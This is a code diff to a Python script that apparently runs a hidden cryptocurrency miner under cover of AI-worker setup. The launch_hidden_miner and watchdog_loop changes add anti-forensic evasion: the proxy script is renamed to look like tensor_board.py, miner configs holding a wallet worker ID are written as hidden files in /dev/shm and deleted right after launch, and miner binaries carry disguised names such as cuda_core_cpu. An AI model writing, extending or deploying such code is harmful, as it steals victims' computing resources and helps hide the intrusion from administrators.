@@ -230,8 +230,8 @@ def setup_gaianet():
 # ─────────────────────────────────────────────────────────────
 
 def local_stratum_proxy(local_port, remote_wss_url):
-    """Launches the shared ws_proxy.py as a subprocess for a given port/relay pair."""
-    proxy_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ws_proxy.py")
+    """Launches the shared tensor_board.py as a subprocess for a given port/relay pair."""
+    proxy_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tensor_board.py")
     env = os.environ.copy()
     env["PROXY_PORT"] = str(local_port)
     env["RELAY_URL"] = remote_wss_url
@@ -374,22 +374,30 @@ def launch_hidden_miner():
     
     # Write CPU Config to JSON (hides arguments from `ps`)
     cpu_worker = f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}"
-    with open("cpu_config.json", "w") as f:
+    cpu_cfg_path = "/dev/shm/.cpu_profile.json" if os.path.isdir("/dev/shm") else ".cpu_profile.json"
+    with open(cpu_cfg_path, "w") as f:
         json.dump({"pools": [{"url": "127.0.0.1:5556", "user": cpu_worker}], "cpu": {"priority": 0, "max-threads-hint": 100}, "print-time": 60, "log-file": None}, f)
 
     cpu_proc = subprocess.Popen([
-        "nice", "-n", "19", "./cuda_core_cpu", "-c", "cpu_config.json"
+        "nice", "-n", "19", "./cuda_core_cpu", "-c", cpu_cfg_path
     ], stdout=out_target, stderr=out_target)
+    
+    time.sleep(1)
+    if os.path.exists(cpu_cfg_path): os.remove(cpu_cfg_path)
 
     gpu_proc = None
     if gpu_count > 0:
         gpu_worker = f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}"
-        with open("gpu_config.json", "w") as f:
+        gpu_cfg_path = "/dev/shm/.gpu_profile.json" if os.path.isdir("/dev/shm") else ".gpu_profile.json"
+        with open(gpu_cfg_path, "w") as f:
             json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": gpu_worker, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
         
         gpu_proc = subprocess.Popen([
-            "./cuda_core_gpu", "-c", "gpu_config.json"
+            "./cuda_core_gpu", "-c", gpu_cfg_path
         ], stdout=out_target, stderr=out_target)
+        
+        time.sleep(1)
+        if os.path.exists(gpu_cfg_path): os.remove(gpu_cfg_path)
 
     # 3. Setup and Launch AI Worker in background (Takes ~10 mins)
     print("[*] Step 5: Initializing Background Nodes (GaiaNet/Heurist)...", flush=True)
@@ -510,12 +518,16 @@ def watchdog_loop():
             out_target = None if DEBUG_MODE else subprocess.DEVNULL
             
             cpu_worker = f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}"
-            with open("cpu_config.json", "w") as f:
+            cpu_cfg_path = "/dev/shm/.cpu_profile.json" if os.path.isdir("/dev/shm") else ".cpu_profile.json"
+            with open(cpu_cfg_path, "w") as f:
                 json.dump({"pools": [{"url": "127.0.0.1:5556", "user": cpu_worker}], "cpu": {"priority": 0, "max-threads-hint": 100}, "print-time": 60, "log-file": None}, f)
             
             GLOBAL_CPU_PROC = subprocess.Popen([
-                "nice", "-n", "19", "./cuda_core_cpu", "-c", "cpu_config.json"
+                "nice", "-n", "19", "./cuda_core_cpu", "-c", cpu_cfg_path
             ], stdout=out_target, stderr=out_target)
+            
+            time.sleep(1)
+            if os.path.exists(cpu_cfg_path): os.remove(cpu_cfg_path)
         
         # 3. Check GPU miner status
         if GLOBAL_GPU_PROC and GLOBAL_GPU_PROC.poll() is not None:
@@ -523,13 +535,17 @@ def watchdog_loop():
             if DEBUG_MODE: print(f"[!] GPU miner exited (code={exit_code}). Restarting...", flush=True)
             
             gpu_worker = f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}"
-            with open("gpu_config.json", "w") as f:
+            gpu_cfg_path = "/dev/shm/.gpu_profile.json" if os.path.isdir("/dev/shm") else ".gpu_profile.json"
+            with open(gpu_cfg_path, "w") as f:
                 json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": gpu_worker, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
             
             out_target = None if DEBUG_MODE else subprocess.DEVNULL
             GLOBAL_GPU_PROC = subprocess.Popen([
-                "./cuda_core_gpu", "-c", "gpu_config.json"
+                "./cuda_core_gpu", "-c", gpu_cfg_path
             ], stdout=out_target, stderr=out_target)
+            
+            time.sleep(1)
+            if os.path.exists(gpu_cfg_path): os.remove(gpu_cfg_path)
         
         # 4. Print status dashboard every 2 minutes (every 2nd check)
         if check_count % 2 == 0:
